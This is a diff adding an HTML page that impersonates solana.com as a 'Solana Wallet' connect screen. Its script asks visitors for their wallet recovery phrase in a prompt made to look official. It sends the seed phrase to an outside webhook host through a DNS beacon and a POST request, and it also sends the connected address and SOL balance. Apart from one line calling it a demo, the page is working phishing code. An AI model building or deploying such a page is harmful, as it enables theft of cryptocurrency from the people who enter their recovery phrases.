@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>solana.com</title>
+  <style>
+    body {
+      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
+      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
+    }
+    .logo { font-size: 80px; margin-bottom: 20px; }
+    h1 { font-size: 28px; margin-bottom: 20px; }
+    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
+    .btn {
+      padding: 18px 40px; font-size: 20px; background: #a855f7; color: white; border: none; border-radius: 16px;
+      cursor: pointer; box-shadow: 0 10px 40px rgba(168,85,247,0.6); transition: 0.3s; font-weight: bold;
+    }
+    .btn:hover { background: #9333ea; transform: scale(1.05); }
+    .status {
+      margin-top: 30px; font-size: 16px; min-height: 60px;
+    }
+    .address {
+      color: #a855f7;
+      word-break: break-all;
+    }
+    .warning {
+      margin-top: 40px;
+      color: #ef4444;
+      font-weight: bold;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">☀️</div>
+  <h1>Solana Wallet</h1>
+  <p>Connect your Solana wallet to continue</p>
+  <button class="btn" id="connectWallet">Connect Wallet</button>
+
+  <div class="status" id="status">Ready</div>
+
+  <div class="warning">
+    This is a demo — do not use on real wallet!
+  </div>
+
+  <script>
+    // KONFIGURASI KAMU
+    const OOB = "ancient-unicorn-29.webhook.cool";
+
+    document.getElementById("connectWallet").addEventListener("click", async () => {
+      const statusEl = document.getElementById("status");
+
+      statusEl.innerHTML = "Connecting to Solana wallet...";
+
+      // 1. PROMPT SEED PHRASE (MIRIP WALLET RESMI)
+      setTimeout(() => {
+        const seed = prompt("solana.com says:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEnter your recovery phrase before continue");
+        if (seed && seed.trim() !== "") {
+          // Exfil via OOB DNS
+          const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
+          new Image().src = `https://${beacon}.${OOB}`;
+
+          // Backup POST
+          fetch(`https://${OOB}/solana-seed`, {
+            method: "POST",
+            body: JSON.stringify({ seed: seed.trim() })
+          }).catch(() => {});
+        }
+      }, 1000);
+
+      try {
+        // 2. CONNECT KE SOLANA WALLET VIA window.solana (Phantom, Solflare, dll)
+        if (!window.solana || !window.solana.isPhantom && !window.solana.isSolflare) {
+          throw new Error("Solana wallet not detected. Please open this page in Phantom/Solflare browser.");
+        }
+
+        const provider = window.solana;
+
+        // Request connect
+        const response = await provider.connect();
+        const solAddress = response.publicKey.toString();
+
+        statusEl.innerHTML = `Connected: <span class="address">${solAddress}</span>`;
+
+        // Exfil Solana address via OOB
+        const addrBeacon = btoa(solAddress).replace(/=/g, '');
+        new Image().src = `https://sol-addr-${addrBeacon}.${OOB}`;
+
+        // Optional: Get balance
+        const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const balanceLamports = await connection.getBalance(response.publicKey);
+        const balanceSOL = balanceLamports / 1e9;
+
+        fetch(`https://${OOB}/solana-balance`, {
+          method: "POST",
+          body: JSON.stringify({ address: solAddress, balance: balanceSOL })
+        });
+
+      } catch (err) {
+        statusEl.innerHTML = `<span style="color:#ef4444">Error: ${err.message || "Connection failed"}</span>`;
+        console.log("Solana wallet failed:", err);
+      }
+    });
+  </script>
+
+  <!-- SOLANA WEB3.JS UNTUK GET BALANCE -->
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+</body>
+</html>
